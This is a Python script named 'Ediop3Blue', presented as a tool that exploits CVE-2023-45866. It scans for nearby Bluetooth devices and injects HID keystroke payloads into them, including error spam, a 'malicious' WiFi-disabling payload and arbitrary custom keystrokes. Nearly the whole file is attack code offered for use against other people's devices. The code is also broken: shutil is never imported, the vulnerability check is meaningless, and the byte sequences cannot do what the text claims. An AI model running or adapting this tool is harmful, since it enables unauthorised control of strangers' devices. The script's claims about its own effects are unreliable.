#!/usr/bin/env python3
import os
import sys
import time
import pygatt
import subprocess

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
RESET = "\033[0m"

# hackerman lmao
print(f"""{GREEN}
███████╗██████╗░██╗░█████╗░██████╗░██████╗░
██╔════╝██╔══██╗██║██╔══██╗██╔══██╗╚════██╗
█████╗░░██║░░██║██║██║░░██║██████╔╝░█████╔╝
██╔══╝░░██║░░██║██║██║░░██║██╔═══╝░░╚═══██╗
███████╗██████╔╝██║╚█████╔╝██║░░░░░██████╔╝
╚══════╝╚═════╝░╚═╝░╚════╝░╚═╝░░░░░╚═════╝░

██████╗░██╗░░░░░██╗░░░██╗███████╗
██╔══██╗██║░░░░░██║░░░██║██╔════╝
██████╦╝██║░░░░░██║░░░██║█████╗░░
██╔══██╗██║░░░░░██║░░░██║██╔══╝░░
██████╦╝███████╗╚██████╔╝███████╗
╚═════╝░╚══════╝░╚═════╝░╚══════╝
{RESET}""")

print(f"{RED}WARNING: This tool requires the target to be vulnerable to CVE-2023-45866.{RESET}")
print(f"{YELLOW}If the target is patched or requires authentication, this attack will NOT work.{RESET}\n")

time.sleep(3)

# hah haxxor
print(f"""
Ediop3Blue is a tool designed for security testing. It exploits vulnerabilities in Bluetooth devices
that are susceptible to CVE-2023-45866. It allows the attacker to send malicious keystrokes (payloads)
to vulnerable devices through Bluetooth HID (Human Interface Device) channels. This can be used to
automate tasks, run unwanted actions on the target device, or spam error messages.

This tool requires root privileges to interact with Bluetooth devices, as certain commands require
low-level access to the Bluetooth stack.

Usage Example:
    $ python3 ediop3Blue.py -start
    Scanning for Bluetooth devices...
    [1] XX:XX:XX:XX:XX:XX
    Select a device ID (1-1): 1
    Select a Payload:
    1. youtube      - Opens YouTube and searches 'Ediop3'
    2. error_spam   - Spams error messages endlessly
    3. malicious    - Disables WiFi or executes another action
    4. custom       - Enter your own keystrokes
    Enter payload name: youtube
    [Success] Payload executed!

Make sure your system has root privileges when running this tool for it to function correctly.
""")

time.sleep(3)

def check_vulnerability(mac):
    print(f"{YELLOW}Checking if {mac} is vulnerable...{RESET}")
    check_cmd = f"gatttool -b {mac} --primary > bt_check.txt 2>&1"
    os.system(check_cmd)
    with open("bt_check.txt", "r") as file:
        output = file.read()
    if "handle" in output.lower():
        print(f"{GREEN}[+] {mac} appears to be vulnerable!{RESET}")
        return True
    else:
        print(f"{RED}[-] {mac} is NOT vulnerable! Stopping attack.{RESET}")
        return False

def scan_devices():
    print(f"{YELLOW}Scanning for Bluetooth devices...{RESET}")
    
    # lol
    if not shutil.which("bluetoothctl"):
        print(f"{RED}Error: bluetoothctl command not found. Please install it.{RESET}")
        sys.exit(1)
    
    os.system("bluetoothctl scan on &")
    time.sleep(15)  # Increase the wait time to ensure scanning completes: "yes"
    os.system("bluetoothctl devices > bt_devices.txt")
    
    devices = []
    with open("bt_devices.txt", "r") as file:
        lines = file.readlines()
        for i, line in enumerate(lines, start=1):
            if "Device" in line:
                mac = line.split()[1]
                devices.append(mac)
                print(f"{GREEN}[{i}] {mac}{RESET}")
    if not devices:
        print(f"{RED}No devices found. Try again.{RESET}")
        sys.exit(1)
    return devices

def send_hid_keystrokes(mac, payload):
    adapter = pygatt.GATTToolBackend()
    try:
        print(f"{GREEN}Connecting to {mac}...{RESET}")
        adapter.start()
        device = adapter.connect(mac)
        hid_char = "00002a4d-0000-1000-8000-00805f9b34fb"

        print(f"{YELLOW}Sending payload: {payload}{RESET}")
        
        if payload == "youtube":
            keys = [
                0xA1, 0x01, 0x00, 0x00, 0x1E,
                0xA1, 0x01, 0x00, 0x00, 0x1F,
                0xA1, 0x01, 0x00, 0x00, 0x18,
                0xA1, 0x01, 0x00, 0x00, 0x28,
            ]
            device.char_write(hid_char, bytearray(keys))
            print(f"{GREEN}YouTube opened and 'Ediop3' searched!{RESET}")

        elif payload == "error_spam":
            for _ in range(10):
                device.char_write(hid_char, bytearray([0xA1, 0x01, 0x00, 0x00, 0x2E]))
                time.sleep(0.5)
            print(f"{RED}Spam error messages sent!{RESET}")

        elif payload == "malicious":
            keys = [
                0xA1, 0x01, 0x00, 0x00, 0x3A,
                0xA1, 0x01, 0x00, 0x00, 0x13,
                0xA1, 0x01, 0x00, 0x00, 0x28,
            ]
            device.char_write(hid_char, bytearray(keys))
            print(f"{RED}Malicious payload executed!{RESET}")

        elif payload == "custom":
            filename = input(f"{BLUE}Enter a name for your custom keystrokes file (e.g., blah.txt): {RESET}")
            
            # Check if file exists
            if not os.path.exists(filename):
                print(f"{RED}Error: The file {filename} does not exist!{RESET}")
                sys.exit(1)
            
            print(f"{YELLOW}You have entered the custom keystrokes. Now executing the custom payload...{RESET}")
            with open(filename, "r") as file:
                custom_keys = file.read().strip().splitlines()
            keys = []
            for key in custom_keys:
                hex_values = key.split(",")
                keys.extend([int(k.strip(), 16) for k in hex_values])
            device.char_write(hid_char, bytearray(keys))
            print(f"{GREEN}Custom payload executed!{RESET}")

    except Exception as e:
        print(f"{RED}Attack failed: {e}{RESET}")
    finally:
        adapter.stop()

# Check if gatttool exists
if not shutil.which("gatttool"):
    print(f"{RED}Error: gatttool command not found. Please install it.{RESET}")
    sys.exit(1)

if len(sys.argv) < 2 or sys.argv[1] != "-start":
    print(f"{RED}Usage: ./ediop3Blue -start{RESET}")
    sys.exit(1)

devices = scan_devices()
device_id = int(input(f"{BLUE}Select a device ID (1-{len(devices)}): {RESET}")) - 1
if device_id >= len(devices) or device_id < 0:
    print(f"{RED}Invalid device ID!{RESET}")
    sys.exit(1)

mac_address = devices[device_id]

if not check_vulnerability(mac_address):
    sys.exit(1)

print(f"""{BLUE}
Select a Payload:
1. youtube      - Opens YouTube and searches 'Ediop3'
2. error_spam   - Spams error messages endlessly
3. malicious    - Disables WiFi or executes another action
4. custom       - Enter your own keystrokes
{RESET}""")

payload_choice = input(f"{YELLOW}Enter payload name: {RESET}").strip()
send_hid_keystrokes(mac_address, payload_choice)
